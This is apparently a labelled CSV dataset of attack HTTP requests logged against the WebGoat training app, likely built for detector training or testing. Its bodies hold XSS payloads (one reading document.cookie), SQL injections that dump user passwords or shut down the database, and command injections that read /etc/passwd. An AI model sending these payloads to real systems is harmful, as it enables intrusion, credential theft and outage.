source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=wxRNxznm,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2643'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7302'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8809'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'qRvxFNOT'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=MfX2759U,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9588'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'SCMANll6'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2745'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=yjqF53af,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1460'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3057'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=u1NYC7x4,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=G7duLMlq,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'a1FVzVtm'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=fu7O3svJ,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1867'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Lr1Yr8lA,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XWQaaIVT'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'YchRb5Gx'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=jD9KDtts,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7486'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8447'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '67ZXvP1g'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=Gs2e26ec,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6767'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=JPFxsdMV,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7724'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=oSvgyvr2,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=dH3pK6Jm,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=aC9GuejU,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5607'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'u9ReewCu'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'k5REBMuy'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=sU4XbyKw,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Orse65qR'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4540'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=viY9ZkWg,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9241'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6222'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'k6DLb2vQ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'w1joTtI1'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'lYyc9X1k'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=VGicpVXO,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=7T3ycyiF,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'YqdAC96m'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'aJmfHLtW'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'PBB3NVAC'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1383'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2445'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6822'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4177'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=n7826OJv,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=XtFEIcQw,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=EUbU3DYC,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Inr8Rb1s'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'rcOlCTLE'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4389'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9916'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=oR7snJ8k,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'dHAfYkJZ'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QmJaAcwf'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2755'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=jgqIvK5v,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'KA4MpF7q'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'HSjas806'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Gfvh0q59'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'kslrNxsn'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'DJPxeYZD'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'I8OkTGUo'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=cUr1bxPl,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=VaK8nt9e,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'VZB7dAb6'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '7iY37xZL'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XAT78S3M'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=Bd4sL1Nr,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'SthwGU6t'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=eBc5QEoA,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'mJl3XAGx'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6363'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'ttGYd5WD'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=KKJvwobW,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'mhFueru5'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3506'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=4qSfjWNh,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=eoYd1TiW,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'dYVceXuA'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=yTy2kx4f,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=6Hr04QcU,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '1B9cEhgz'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=X5zXjtj9,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Ied8HESm,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=cON25zP9,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=YT9V7g9X,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XVICALSS'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'i57ojULR'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Kvo97IHP'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=mQJtlZz1,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'RMgAGeUR'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7565'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=ttnkimL1,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=cJZnjN6V,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=sfd0y3qh,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2998'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9738'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'v7KcOSAP'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3175'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7286'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=ajKQ0Nnr,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8092'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'OHdWp6n5'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'GSE4mX1Z'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'rY3ZSMoR'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=EBpF9rSz,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=FcxrBLRp,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'NfQKZp6I'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Zyql1jS1'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=nW541FbA,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6667'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=nQyL1aiB,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'OZkQvmRy'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=qOvVZnnr,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=t1ATS9Qn,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=IGcZwgQv,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=NHjbywk3,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Yt7wfM45'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '8mk7ih4L'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1519'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8577'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'GhQuwPNw'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=St5i9MrP,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=hdsHHrM5,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=zcI6zOGM,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=boeY7MMP,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Sp1qEG66,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7691'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6517'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3628'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1066'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=CnkTTThj,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=ZYfK2RYc,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=IsuEmABj,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 's95RvftQ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'h0VISM2x'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=WCyG45Dx,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3005'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'LIe81LBE'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=ynxvfpBs,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4067'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'A4aHy6rC'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=BUyUjHYY,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4195'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'yeJ1m6up'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6324'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6590'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=g7DDnkZR,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=oTCaomDF,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QG7Z61fm'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'ELVwqBWc'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2175'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3467'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'wIiRpacO'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8804'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,cia/command-injection,"[('_uid', 'cIekCE9P'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=HsMjGIcu,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'SAekGwqF'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=MDV53Pot,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7365'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'scexXVU8'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=mbWU0rfs,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'TpA6QjN0'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9857'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5508'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'nHHik54J'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=8Q2So4yC,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XC8IbT8h'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1028'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'pbnr9WtU'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'pkNyThRA'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9167'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6701'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7139'), ('name', '101 OR 1=1; --')]",200,273
